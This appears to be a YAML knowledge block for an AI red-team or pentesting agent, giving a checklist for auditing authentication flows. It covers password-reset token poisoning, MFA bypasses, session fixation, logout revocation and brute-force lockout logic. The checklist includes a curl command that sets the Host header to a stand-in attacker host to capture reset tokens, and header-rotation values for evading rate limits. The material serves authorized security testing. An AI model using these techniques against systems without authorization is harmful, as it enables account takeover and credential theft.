knowledge: |
  Audit application authentication architectures, state machine transitions, and multi-factor validation flows with senior red-team precision.

  1. PASSWORD RESET FLOW & TOKEN POISONING:
     - Host Header Poisoning for Reset Links:
       Submit password reset requests while tampering with the `Host` or `X-Forwarded-Host` headers:
       `curl -s -X POST -H "Host: attacker.com" -d "email=victim@target.com" "<url>/api/reset-password"`
       If the backend uses the Host header to construct the password reset link (`https://attacker.com/reset?token=...`), the user's secret token is delivered to the attacker's server upon click.
     - Reset Token Entropy & Predictability:
       Request multiple consecutive reset tokens and analyze randomness (check for timestamp-based generation, weak PRNG seeds, or sequential identifiers).
     - Parameter Tampering in Reset Completion:
       Test if the final password update POST endpoint accepts an explicit user identifier (e.g. `userId=123`, `email=victim@target.com`) overriding the token context.

  2. MULTI-FACTOR AUTHENTICATION (MFA / 2FA) BYPASSES:
     - Direct Forced Browsing (State Skipping):
       Navigate directly to authenticated endpoints (`/dashboard`, `/api/user/profile`, `/settings`) immediately after completing step 1 (password verification) without submitting step 2 (OTP code).
     - Response Code & Body Tampering:
       Submit an intentionally incorrect OTP code and tamper with the response:
       Change HTTP `401 Unauthorized` or `{"success": false}` to HTTP `200 OK` or `{"success": true, "status": "authenticated"}`.
     - Race Conditions in OTP Consumption:
       Send concurrent identical OTP validation requests to test whether single-use codes can be validated multiple times before invalidation.
     - 2FA Code Leakage:
       Inspect HTTP response bodies, client-side JavaScript bundles, and API responses during 2FA initiation to verify whether the OTP code or secret seed is accidentally leaked to the client.

  3. SESSION MANAGEMENT & CONCURRENCY CONTROLS:
     - Session Fixation:
       Obtain a pre-login session cookie; verify whether the session ID changes after successful authentication. If the server retains the same session ID post-authentication, an attacker can fix the victim's session.
     - Incomplete Logout & Token Revocation:
       Verify whether session tokens remain valid after explicit logout or password change:
       Send an API request using the old token after logout. If HTTP 200 is returned, server-side revocation is missing.
     - Concurrent Session Hijacking:
       Verify whether logging in from a new IP/device properly invalidates or alerts existing sessions according to organizational policy.

  4. BRUTE-FORCE & ACCOUNT LOCKOUT LOGIC:
     - Rate-Limit Evasion Techniques:
       Rotate client IP headers across brute-force probes:
       `X-Forwarded-For: 10.0.0.$i`, `X-Real-IP: 192.168.1.$i`, `Client-IP: 172.16.0.$i`.
     - Denial-of-Service via Lockout:
       Test whether unauthenticated login attempts trigger system-wide account lockouts for administrative accounts, enabling denial-of-service against legitimate operators.
